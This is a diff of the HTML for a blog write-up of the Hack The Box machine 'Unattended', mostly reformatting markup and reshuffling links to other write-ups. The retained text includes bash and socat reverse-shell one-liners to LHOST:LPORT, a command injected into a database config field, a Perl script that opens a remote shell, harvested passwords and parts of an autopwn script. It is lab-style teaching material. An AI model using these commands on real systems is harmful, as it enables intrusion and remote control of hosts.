-<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1'
-</code></pre>
-
-<pre><code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT
-</code></pre>
-
+<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1&#39;</code></pre><pre><code>socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
+socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT</code></pre>
 <p><p></p>
 Or you can try my <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Unattended/autopwn_unattended.py" target="_blank">autopwn script</a>:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[*] LHOST: dead:beef:2::12d0
+<div class="bg-black"><pre><code class="language-console" data-lang="console">[*] LHOST: dead:beef:2::12d0
 
 What shell do you want?
 [1] www-data@unattended
@@ -680,19 +645,19 @@ Please enter a number 1-4: 1
 [*] LFI via SQLI status code: 200
 [+] Testing RCE: SUCCESS
 [*] Switching to interactive mode
-www-data@unattended:/var/www/html$</code></pre></div></div></p>
+www-data@unattended:/var/www/html$</code></pre></div></p>
 
 <h2 id="getting-user-guly">Getting user guly</h2>
 
 <p>Do you remember the table &lsquo;config&rsquo;? Now that we have command execution and the database credentials we can examine it again like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
+<div class="bg-black"><pre><code class="language-console" data-lang="console">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
 
 ...
 |  86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; |
-....</code></pre></div></div></p>
+....</code></pre></div></p>
 
 <p>Hmmm&hellip; This line looks fishy. Let&rsquo;s try to exploit it in order to run our own Perl script. First, we have to find an executable and writable location for our perl script:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ find / -writable -type d 2&gt; /dev/null
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ find / -writable -type d 2&gt; /dev/null
 /proc/1746/task/1746/fd
 /proc/1746/fd
 /proc/1746/map_files
@@ -719,10 +684,10 @@ tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
 tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
 ...
 tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
-tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)</code></pre></div></div></p>
+tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)</code></pre></div></p>
 
 <p>As you can see several paths (<strong><em>/dev/shm, /tmp, /var/tmp</em></strong>) are mounted using the &lsquo;noexec&rsquo; option. This means that if we put our Perl script here, it cannot be executed. So, let&rsquo;s make a directory inside <strong><em>/var/lib/php/sessions</em></strong> and put it there instead:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ mkdir /var/lib/php/sessions/a
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mkdir /var/lib/php/sessions/a
 
 $ which perl
 /usr/bin/perl
@@ -732,30 +697,30 @@ $ which socat
 
 $ printf &#39;#!/usr/bin/perl\nexec(&#34;/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34;);\n&#39; &gt; /var/lib/php/sessions/a/checkrelease.pl
 
-$ chmod +x /var/lib/php/sessions/a/checkrelease.pl</code></pre></div></div></p>
+$ chmod +x /var/lib/php/sessions/a/checkrelease.pl</code></pre></div></p>
 
 <p>Now, we have to alter the database appropriately:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;/var/lib/php/sessions/a/checkrelease.pl;&#34; where option_name=&#34;checkrelease&#34;&#39; neddy</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;/var/lib/php/sessions/a/checkrelease.pl;&#34; where option_name=&#34;checkrelease&#34;&#39; neddy</code></pre></div></p>
 
 <p>Let&rsquo;s verify out change:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
+<div class="bg-black"><pre><code class="language-console" data-lang="console">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
 
 ...
 |  86 | checkrelease | /var/lib/php/sessions/a/checkrelease.pl; |
-....</code></pre></div></div></p>
+....</code></pre></div></p>
 
 <p>Don&rsquo;t forget to setup your listener:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ socat file:`tty`,echo=0,raw tcp-listen:LPORT
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ socat file:`tty`,echo=0,raw tcp-listen:LPORT
 
 guly@unattended:~$ cat user.txt
 cat user.txt
-9b413f3******************70eef14</code></pre></div></div></p>
+9b413f3******************70eef14</code></pre></div></p>
 
 <p>Later, I discovered that there is no need for a Perl script. We can simply put any shell command in that database field like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;socat exec:/bin/bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34; where option_name=&#34;checkrelease&#34;&#39; neddy</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;socat exec:/bin/bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34; where option_name=&#34;checkrelease&#34;&#39; neddy</code></pre></div></p>
 
 <p>There is another thing you have to pay attention&hellip; The host-based firewall (iptables):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /etc/iptables/rules.v4
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /etc/iptables/rules.v4
 # Generated by iptables-save v1.6.0 on Wed Dec 19 21:55:49 2018
 *filter
 :INPUT DROP [7:1813]
@@ -781,26 +746,26 @@ $ cat /etc/iptables/rules.v6
 :FORWARD ACCEPT [0:0]
 :OUTPUT ACCEPT [0:0]
 COMMIT
-# Completed on Thu Dec 20 12:27:54 2018</code></pre></div></div></p>
+# Completed on Thu Dec 20 12:27:54 2018</code></pre></div></p>
 
 <p>As you can see only ports 80 and 443 are allowed for IPv4 and therefore we have to use one of them for our remote shell. Of course, we can use the IPv6 protocol instead (for which all ports are allowed).</p>
 
 <h2 id="getting-root">Getting root</h2>
 
 <p>Let&rsquo;s see what groups is user <em>guly</em> a member of:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">guly@unattended:~$ groups
-guly cdrom floppy audio dip video plugdev grub netdev</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~$ groups
+guly cdrom floppy audio dip video plugdev grub netdev</code></pre></div></p>
 
 <p>The group &lsquo;<strong>grub</strong>&rsquo; stands out. This is not a common group. Let&rsquo;s find what files belong to this group:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">guly@unattended:~$ find / -group grub 2&gt; /dev/null
-/boot/initrd.img-4.9.0-8-amd64</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~$ find / -group grub 2&gt; /dev/null
+/boot/initrd.img-4.9.0-8-amd64</code></pre></div></p>
 
 <p>Let&rsquo;s explore this initrd image. We can decompress it like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">guly@unattended:~$ mkdir .test &amp;&amp; cd .test
-guly@unattended:~/.test$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~$ mkdir .test &amp;&amp; cd .test
+guly@unattended:~/.test$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv</code></pre></div></p>
 
 <p>The name of this box is &ldquo;Unattended&rdquo;. Maybe the administrators have automated some procedures inside the initrd image. Let&rsquo;s search for hardcoded passwords:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ grep -n3 -IR password
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ grep -n3 -IR password
 ...
 scripts/local-top/cryptroot-299-        if [ ! -e &#34;$NEWROOT&#34; ]; then
 scripts/local-top/cryptroot:300:      # guly: we have to deal with lukfs password sync when root changes her one
@@ -810,18 +775,18 @@ scripts/local-top/cryptroot:303:                message &#34;cryptsetup: cryptse
 scripts/local-top/cryptroot-304-                sleep 3
 scripts/local-top/cryptroot-305-                continue
 scripts/local-top/cryptroot-306-            fi
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>This &lsquo;/sbin/uinitrd c0m3s3f0ss34nt4n1&rsquo; looks promising&hellip;. Let&rsquo;s try it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">guly@unattended:~/.test$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
-132f93ab100671dcb263acaf5dc95d8260e8b7c6</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~/.test$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
+132f93ab100671dcb263acaf5dc95d8260e8b7c6</code></pre></div></p>
 
 <p>The comment says &ldquo;# guly: we have to deal with lukfs password sync when root changes her one&rdquo;. Maybe this &lsquo;132f93ab100671dcb263acaf5dc95d8260e8b7c6&rsquo; is the root password. Let&rsquo;s try it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">guly@unattended:~/.test$ su - root
+<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~/.test$ su - root
 Password: 132f93ab100671dcb263acaf5dc95d8260e8b7c6
 
 root@unattended:~# cat /root/root.txt
-559c0**********************791d3</code></pre></div></div></p>
+559c0**********************791d3</code></pre></div></p>
 
 <p>Bingo! That&rsquo;s all folks! :o)</p>
 
@@ -937,7 +902,7 @@ root@unattended:~# cat /root/root.txt
 <span class="k">while</span> <span class="n">response</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">]:</span>
     <span class="n">response</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;Please enter a number 1-4: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
 <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
     
 
 <span class="k">try</span><span class="p">:</span>
@@ -948,7 +913,7 @@ root@unattended:~# cat /root/root.txt
 
 <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
     <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">wwwdata_shell</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing perl script: /var/lib/php/sessions/a/checkrelease.pl&#34;</span><span class="p">)</span>
 <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;mkdir /var/lib/php/sessions/a&#34;</span><span class="p">)</span>
@@ -967,7 +932,7 @@ root@unattended:~# cat /root/root.txt
 
 <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span>
     <span class="n">guly_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">guly_shell</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">guly_shell</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 
 
 <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span>
@@ -975,7 +940,7 @@ root@unattended:~# cat /root/root.txt
     <span class="n">guly_shell</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Password:&#34;</span><span class="p">)</span>
     <span class="n">guly_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;132f93ab100671dcb263acaf5dc95d8260e8b7c6&#34;</span><span class="p">)</span>
     <span class="n">guly_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">guly_shell</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">guly_shell</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 
 
 <span class="s1">&#39;&#39;&#39;
@@ -1070,21 +1035,753 @@ root@unattended:~# cat /root/root.txt
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nl80211/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
+      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Oct 2016</time>
+      <time lang="el">09 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
     </footer>
   </a>
 </article>
@@ -1167,598 +1864,6 @@ root@unattended:~# cat /root/root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nl80211/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
-      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Oct 2016</time>
-      <time lang="el">09 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
